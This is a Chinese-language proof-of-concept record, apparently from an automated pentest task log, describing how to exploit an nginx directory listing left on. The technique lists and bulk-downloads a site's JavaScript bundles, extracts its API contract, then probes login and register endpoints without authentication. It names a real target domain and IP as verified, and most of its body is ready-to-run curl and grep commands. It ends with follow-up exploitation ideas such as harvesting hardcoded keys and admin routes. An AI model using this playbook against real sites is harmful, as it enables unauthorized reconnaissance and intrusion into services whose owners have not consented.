# nginx autoindex 未关闭：双 SPA 前端 /static/js/ 与 /static2/js/ 全量构建产物匿名可列 → API 契约全量还原

- **code**: nginx-autoindex-未关闭-双-spa-前端-static-js-与-static2-js-全量构建
- **kind**: poc
- **category**: info-leak
- **component**: nginx autoindex（autoindex on）+ 自研双 SPA（顾客端 + 中控端 webpack/vite 构建产物）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#616，2026-11-06 本机 Windows python requests(trust_env=False, verify=False) 直连 154.12.24.246:443 并带 Host: console.yhj.lol：① GET /static/js/ → 200 / text/html / 7941B，<pre><a href="app.646488a7.js">…</a> 共 125 个 js 项；② GET /static2/js/ → 200 / 12091B，列出 app.5d64455b.js 及 170 个 chunk-*.js/.gz；③ 匿名 GET /static/js/app.646488a7.js → 200 / 183690B，grep 出 register:function(e){return On("/customer/Register/Verify",e)}、login:…"/customer/Login/Verify"、captcha:…"/customer/Login/Captcha" 等完整 API 契约。产物落 D:/ARTEX/data/tasks/616/i11371/js1/。判定成立依据：目录列表与 chunk 下载均无需任何凭据/会话，且内容为真实业务 SPA 构建产物。
- **path**: pocs/nginx-autoindex-未关闭-双-spa-前端-static-js-与-static2-js-全量构建/poc.md
- **tags**: nginx,autoindex,static-js,spa,source-leak,api-contract,frontend-reverse,no-auth
- **created_at**: 2026-11-06T07:18:35.704Z
- **engine**: console.yhj.lol / 154.12.24.246:443

## 描述

nginx 默认开启 autoindex，导致前端构建目录（/static/js/、/static2/js/）被匿名目录列举；逐个下载 app.*.js / chunk-*.js 即可还原全部路由、接口路径、字段名与请求编码方式，等于拿到完整前端源码与后端 API 契约。适用面：任何"静态资源与 SPA 同域、nginx 未对 js 目录设 autoindex off"的站点，常出现在单独的前端/中控子域（console/static/admin 前缀）。

## 用法

```
1) 定位候选目录：先看首页 index.html 的 <script src>，把路径截到目录（如 /static/js/、/static2/js/、/assets/、/js/），再补 console./static./admin. 子域。
2) 直连源站时保持真实 Host（纯 IP 访问必须带 Host，否则回默认站点/404；有代理必须 trust_env=False / --noproxy '*'，自签证书 verify=False / -k）：

  curl -k -sS --noproxy '*' -D - -H 'Host: <真实域名>' 'https://<IP>/static/js/' | head -40
  curl -k -sS --noproxy '*' -H 'Host: <真实域名>' 'https://<IP>/static2/js/' -o l2.html   # 第二套 SPA/中控端

3) 判据：HTTP 200 + Content-Type: text/html; charset=utf-8 + 正文是 <pre><a href="xxx.js"> 列表。拿到列表直接批量抓：

  grep -o 'href="[^"]*\.js"' list.html | cut -d'"' -f2 | while read f; do
    curl -k -sS --noproxy '*' -H "Host: <真实域名>" "https://<IP>/static/js/$f" -o "js/$f"; done

4) 从 bundle 抽契约（app.*.js 是 webpack runtime + 公共 api 定义，业务在 chunk-*.js）：
  grep -oE '"(/[A-Za-z0-9_/-]{3,})"' js/*.js | sort -u
  grep -oE '[a-zA-Z]+\("[^"]*/(Verify|Login|Register|Captcha|List|Query)[^"]*"' js/*.js
  同时看 axios/fetch 封装：params 是 form 编码还是 JSON、是否带 X-Token/X-Sign 头、是否有 dots=x,y 之类拼接参数。
5) 拿到接口清单后先做未授权探测（不带任何 Cookie/Token），200/业务 JSON 即为真未授权；401/403 说明缺鉴权头，回 bundle 找签名/加密逻辑再复算。

失败时的常见原因：a) 目标走了 CDN，源站 IP 与边缘 Host 白名单不匹配 → 需 --resolve 固定边缘或换直连 IP；b) 目录名猜错（有的区分大小写、有的是 /js/ 无 static 前缀）；c) autoindex 关着但仍可下具体文件 → 改从 index.html / 首页 bundle 里抠真实 hash 文件名；d) 只有目录 403（autoindex off）时不要再穷举，转去 frontend-reverse 找 sourcemap（*.js.map）与公开 GitHub 仓库。
```

## 正文

```
# nginx autoindex 未关闭 → 双 SPA 前端全量构建产物匿名泄露

## 一句话
静态资源目录（`/static/js/`、`/static2/js/`）未关闭 `autoindex`，匿名即可列出并下载全部前端 chunk，
从而还原完整前端源码与后端 API 契约（含注册/登录/验证码的路径、字段与编码方式）。

## 前置条件
- 目标为「nginx（或同类）直接服务静态目录 + SPA 同域」架构，典型是单独的前端/中控子域：
  `console.<domain>` / `admin.<domain>` / `static.<domain>`。
- `/static/js/`、`/static2/js/`、`/assets/`、`/js/` 等目录存在且 `autoindex` 未关。
- 仅需 443 可达；无需任何账号、Cookie、Token。

## 复现步骤

### 1. 确认目录可列举
```
GET /static/js/ HTTP/1.1
Host: console.example.com
User-Agent: Mozilla/5.0
```
预期：
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!doctype html>
<pre>
<a href="404.a745a66d.js">404.a745a66d.js</a>
<a href="app.646488a7.js">app.646488a7.js</a>
...
```
同一站点若还有第二套 SPA（顾客端 + 中控/管理端），第二套构建目录通常并列存在，例如 `/static2/js/`
（实测 125 项 / 170 项，含 `.js` 与 `.js.gz`）。

直连源站（纯 IP + 真实 Host，有代理时必须绕开）：
```bash
curl -k -sS --noproxy '*' -D - -H 'Host: console.example.com' 'https://<IP>/static/js/'
curl -k -sS --noproxy '*' -H  'Host: console.example.com'  'https://<IP>/static2/js/'
```

### 2. 批量下载 chunk
```bash
mkdir -p js && \
curl -k -sS --noproxy '*' -H 'Host: console.example.com' 'https://<IP>/static/js/' -o list.html && \
grep -o 'href="[^"]*\.js"' list.html | cut -d'"' -f2 | while read f; do
  curl -k -sS --noproxy '*' -H 'Host: console.example.com' "https://<IP>/static/js/$f" -o "js/$f"
done
# .gz 版本可直接 curl 后 gunzip，或跳过（同名 .js 已能取到）
```

### 3. 从 bundle 还原 API 契约
入口是 `app.*.js`（runtime + 公共 api 定义），业务逻辑在 `chunk-*.js`：
```bash
grep -oE '"[^"]*/(Verify|Login|Register|Captcha|List|Query|Detail|Order|Card)[^"]*"' js/*.js | sort -u
grep -oE '[a-zA-Z_]+:function\([a-z]*\)\{return [A-Za-z]+\([^)]*\)\}' js/app.*.js
grep -nE 'baseURL|axios\.create|transformRequest|qs\.stringify|URLSearchParams|X-Sign|X-Token' js/*.js | head
```
典型产出（实测形态）：
```js
register: function(e){ return On("/customer/Register/Verify", e) }
login:    function(e){ return On("/customer/Login/Verify", e) }
captcha:  function(e){ return On("/customer/Login/Captcha", e) }
```
同时确认请求编码（form-urlencoded 还是 JSON）、附加参数（如 `dots=x,y` 坐标拼接）、是否有前端签名/加密。

### 4. 接口落地探测
对抽出的路径逐个匿名请求（不带 Cookie / Authorization）：
```bash
curl -k -sS --noproxy '*' -H 'Host: console.example.com' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'phone=1&code=1' 'https://<IP>/customer/Login/Verify' -i
```
判据：返回业务 JSON（非 401/403/登录页）= 未授权命中；返回 401/403 则回 bundle 找鉴权头/签名逻辑复算。

## 判据
- 目录请求返回 `200` + `text/html; charset=utf-8` + `<pre><a href="...">` ⇒ autoindex 开启。
- 具体 chunk 匿名下载返回 `200` + `application/javascript` 且体积为真实构建产物（几十 KB ~ 数百 KB）。
- 只有以上两条同时成立才算泄露；单文件 200 但目录 403 属于正常静态服务，不算。

## 失败 / 误判原因
1. **代理改写回包**：本机有全局代理时 `requests` 要走 `trust_env=False`、`curl` 要 `--noproxy '*'`，否则拿到的是代理的错误页。
2. **Host 不对**：纯 IP 直连且不带真实 Host，会落到默认站点（宝塔「没有找到站点」页）或直接 404。
3. **CDN 前置**：边缘只按 Host/SNI 路由，需 `--resolve` 固定边缘 IP 或直接打源站 IP。
4. **目录名猜错**：`/static/js/`、`/static2/js/`、`/assets/`、`/js/`、`/dist/` 都要试；大小写敏感。
5. **autoindex off（403）**：别穷举目录，转去下 `/static/js/app.<hash>.js`（hash 从首页 HTML 抠）与 `.js.map`（sourcemap 往往同目录一起发布）。

## 后续利用方向
- 用完整接口清单做未授权/越权批量探测，比盲扫高效一个数量级。
- bundle 里的硬编码常量（AES key、盐值、第三方 AppID、内网域名、OSS bucket）直接是下一步突破口。
- 中控端（第二套 SPA）的 chunk 里常带管理接口路径与角色/权限字段名，可反推后台路由。

```
